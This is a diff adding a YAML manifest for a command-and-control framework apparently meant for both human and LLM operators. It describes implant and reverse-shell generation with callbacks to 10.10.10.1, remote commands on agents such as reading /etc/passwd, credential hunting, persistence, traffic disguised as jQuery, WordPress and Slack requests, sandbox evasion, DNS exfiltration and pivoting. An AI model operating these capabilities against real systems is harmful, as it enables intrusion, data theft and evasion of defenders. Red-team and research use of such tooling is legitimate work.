@@ -1,0 +1,261 @@
+tool:
+  name: c2-37
+  description: Lightweight C2 framework for humans and LLMs, stdlib-only Python
+  cli_command: c37
+  version: "1.0"
+  language: Python 3 (stdlib only, zero dependencies)
+
+subcommands:
+  start:
+    description: Start the C2 listener on a given host and port
+    usage: c37 start [--host HOST] [--port PORT] [--profile PROFILE]
+    examples:
+      - c37 start
+      - c37 start --port 8443
+      - c37 start --host 0.0.0.0 --port 443 --profile wordpress
+
+  agents:
+    description: List all connected agents with status, OS, and last check-in time
+    usage: c37 agents [--format FORMAT]
+    examples:
+      - c37 agents
+      - c37 agents --format json
+
+  shell:
+    description: Run a shell command on a specific agent
+    usage: c37 shell <agent> <cmd>
+    examples:
+      - c37 shell agent-01 whoami
+      - c37 shell agent-01 "cat /etc/passwd"
+      - c37 shell agent-01 "ls -la /home"
+
+  results:
+    description: Show pending results from a specific agent
+    usage: c37 results <agent> [--tail N] [--follow]
+    examples:
+      - c37 results agent-01
+      - c37 results agent-01 --tail 50
+      - c37 results agent-01 --follow
+
+  generate:
+    description: Generate implants in 8 formats for a given callback address
+    usage: c37 generate <lhost> <lport> [--format FORMAT] [--profile PROFILE] [--evasion TECHNIQUES]
+    formats:
+      python:
+        description: Full Python implant script
+        output: implant.py
+      powershell:
+        description: PowerShell implant for Windows targets
+        output: implant.ps1
+      android:
+        description: Android-compatible Python implant (Termux/QPython)
+        output: implant_android.py
+      stager_python:
+        description: Minimal Python stager that pulls full implant
+        output: stager.py
+      stager_powershell:
+        description: Minimal PowerShell stager
+        output: stager.ps1
+      oneliner_bash:
+        description: One-liner bash reverse connection
+        output: stdout
+      oneliner_python:
+        description: One-liner Python reverse connection
+        output: stdout
+      oneliner_powershell:
+        description: One-liner PowerShell reverse connection
+        output: stdout
+    examples:
+      - c37 generate 10.10.10.1 4444
+      - c37 generate 10.10.10.1 4444 --format powershell
+      - c37 generate 10.10.10.1 443 --profile jquery --evasion randomize,compress,base64
+
+  interact:
+    description: Drop into an interactive shell session with an agent
+    usage: c37 interact <agent>
+    examples:
+      - c37 interact agent-01
+
+  modules:
+    description: List all available post-exploitation modules
+    usage: c37 modules [--category CATEGORY]
+    examples:
+      - c37 modules
+      - c37 modules --category enum
+      - c37 modules --category persist
+
+  run:
+    description: Run a post-exploitation module on a specific agent
+    usage: c37 run <agent> <module> [--args ARGS]
+    examples:
+      - c37 run agent-01 enum_users
+      - c37 run agent-01 persist_cron --args "*/5 * * * *"
+      - c37 run agent-01 enum_suid
+
+modules:
+  - name: enum_users
+    category: enumeration
+    description: Enumerate local users, groups, and privilege levels
+    platforms: [linux, windows, macos]
+
+  - name: enum_network
+    category: enumeration
+    description: Enumerate network interfaces, routes, ARP cache, and listening ports
+    platforms: [linux, windows, macos]
+
+  - name: enum_processes
+    category: enumeration
+    description: Enumerate running processes with user context and command lines
+    platforms: [linux, windows, macos]
+
+  - name: enum_suid
+    category: enumeration
+    description: Find SUID/SGID binaries for privilege escalation
+    platforms: [linux, macos]
+
+  - name: enum_creds
+    category: enumeration
+    description: Search for credentials in common locations (config files, history, env vars)
+    platforms: [linux, windows, macos]
+
+  - name: enum_docker
+    category: enumeration
+    description: Enumerate Docker containers, images, and socket access
+    platforms: [linux]
+
+  - name: persist_cron
+    category: persistence
+    description: Install persistence via cron job
+    platforms: [linux, macos]
+
+  - name: persist_bashrc
+    category: persistence
+    description: Install persistence via .bashrc or .profile injection
+    platforms: [linux, macos]
+
+  - name: screenshot
+    category: collection
+    description: Capture screenshot of the current display
+    platforms: [linux, windows, macos]
+
+  - name: keylog_check
+    category: collection
+    description: Check for keylogging capability and input device access
+    platforms: [linux, windows]
+
+traffic_profiles:
+  default:
+    description: Standard HTTP beacon with randomized intervals
+    content_type: application/octet-stream
+    uri_pattern: /api/v1/check
+
+  jquery:
+    description: Masquerade as jQuery CDN requests
+    content_type: application/javascript
+    uri_pattern: /jquery-3.x.x.min.js
+    headers:
+      referer: https://code.jquery.com/
+
+  wordpress:
+    description: Blend with WordPress admin AJAX traffic
+    content_type: application/x-www-form-urlencoded
+    uri_pattern: /wp-admin/admin-ajax.php
+    headers:
+      cookie: wordpress_logged_in=session
+
+  api:
+    description: Mimic REST API calls with JSON payloads
+    content_type: application/json
+    uri_pattern: /api/v2/telemetry
+    headers:
+      authorization: Bearer <token>
+
+  slack:
+    description: Disguise traffic as Slack webhook posts
+    content_type: application/json
+    uri_pattern: /services/hooks/slackbot
+    headers:
+      user-agent: Slackbot 1.0
+
+evasion:
+  randomize:
+    description: Randomize beacon interval with jitter (default 10-30%)
+  compress:
+    description: Compress payloads with zlib before transmission
+  base64:
+    description: Base64-encode all payloads for transport
+  sandbox:
+    description: Detect sandbox environments (VM artifacts, debuggers, low resources)
+  delay:
+    description: Initial execution delay to evade sandbox detonation timers
+  poly:
+    description: Polymorphic code generation — variable names, structure, and flow randomized per build
+  strings:
+    description: Obfuscate string literals via XOR encoding with per-build keys
+
+pivot:
+  socks5_proxy:
+    description: Start a SOCKS5 proxy through an agent for network pivoting
+    usage: c37 pivot socks5 <agent> [--port 1080]
+    example: c37 pivot socks5 agent-01 --port 1080
+
+  port_forward:
+    description: Forward a local port through an agent to a remote target
+    usage: c37 pivot forward <agent> <local_port> <remote_host> <remote_port>
+    example: c37 pivot forward agent-01 8080 192.168.1.100 80
+
+  ssh_tunnel:
+    description: Wrapper to establish SSH tunnels through compromised hosts
+    usage: c37 pivot ssh <agent> <target> [--dynamic | --local LOCAL:REMOTE]
+    example: c37 pivot ssh agent-01 192.168.1.50 --dynamic 9050
+
+  chisel:
+    description: Helper to deploy and manage chisel tunnels via agents
+    usage: c37 pivot chisel <agent> <mode> [--args ARGS]
+    example: c37 pivot chisel agent-01 client --args "10.10.10.1:8000 R:socks"
+
+dns_beacon:
+  description: DNS-based beacon channel for restricted networks where HTTP is blocked
+  usage: c37 start --channel dns --domain c2.example.com
+  record_types: [A, TXT, CNAME]
+  encoding: base32 subdomains for data exfil, TXT records for tasking
+  example: c37 start --channel dns --domain c2.example.com --port 53
+
+redirector:
+  description: Traffic redirector with IP and User-Agent filtering
+  filtering:
+    ip: Allow/deny lists, GeoIP blocking
+    user_agent: Whitelist expected agent UA strings, block scanners
+  config_generators:
+    iptables:
+      description: Generate iptables DNAT/SNAT rules for port redirection
+      example: c37 redirector generate iptables --listen 443 --target 10.10.10.1:8443
+    socat:
+      description: Generate socat relay commands
+      example: c37 redirector generate socat --listen 80 --target 10.10.10.1:8080
+    nginx:
+      description: Generate nginx reverse proxy config with filtering rules
+      example: c37 redirector generate nginx --listen 443 --target 10.10.10.1:8443 --allow-ua "Mozilla/5.0"
+
+crypto:
+  stream_cipher:
+    algorithm: XOR stream cipher
+    description: XOR-based stream cipher with rotating keys for payload encryption
+    key_exchange: Diffie-Hellman key negotiation on initial check-in
+  integrity:
+    algorithm: HMAC-SHA256
+    description: HMAC-SHA256 message authentication on all C2 traffic
+    coverage: Headers, payload body, and timestamp to prevent replay attacks
+
+dashboard:
+  description: Self-contained web UI served at /dashboard — no external dependencies
+  endpoint: /dashboard
+  features:
+    - Real-time agent map and status table
+    - Command history and output viewer
+    - Module execution interface
+    - Traffic profile selector
+    - Listener management
+    - Implant generator with copy-to-clipboard
+    - Session timeline and event log
+  tech: Single HTML file with inline CSS/JS, served by the C2 listener
